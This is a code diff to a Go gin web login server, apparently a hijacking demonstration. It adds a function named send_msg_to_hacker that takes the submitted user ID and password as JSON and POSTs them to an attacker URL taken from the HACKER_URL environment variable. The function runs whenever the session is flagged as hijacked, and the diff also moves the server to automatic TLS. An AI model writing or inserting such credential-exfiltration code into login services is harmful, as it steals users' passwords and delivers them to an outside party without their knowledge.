@@ -2,11 +2,14 @@ package main
 
 import (
 	"bufio"
+	"bytes"
+	"encoding/json"
 	"fmt"
 	"log"
 	"net/http"
 	"os"
 
+	"github.com/gin-gonic/autotls"
 	"github.com/gin-gonic/gin"
 )
 
@@ -25,6 +28,16 @@ func login_verifier(id string, passwd string) bool {
 		return passwd == val
 	}
 	return false
+}
+
+func send_msg_to_hacker(jjson Login) {
+	hacker_url := os.Getenv("HACKER_URL")
+	json_byte, _ := json.Marshal(jjson)
+	req, _ := http.NewRequest("POST", hacker_url, bytes.NewBuffer(json_byte))
+	req.Header.Set("Content-Type", "application/json")
+
+	client := &http.Client{}
+	client.Do(req)
 }
 
 // Init the (id, pw) fot db global variable
@@ -63,7 +76,7 @@ func main() {
 		}
 
 		if is_hijacked {
-			c.JSON(200, gin.H{"Your password": json.Password})
+			send_msg_to_hacker(json)
 		}
 
 		if ok := login_verifier(json.Id, json.Password); ok {
@@ -77,5 +90,5 @@ func main() {
 		c.JSON(200, gin.H{"ping": "pong"})
 	})
 
-	r.Run()
+	autotls.Run(r, os.Getenv("URL"))
 }
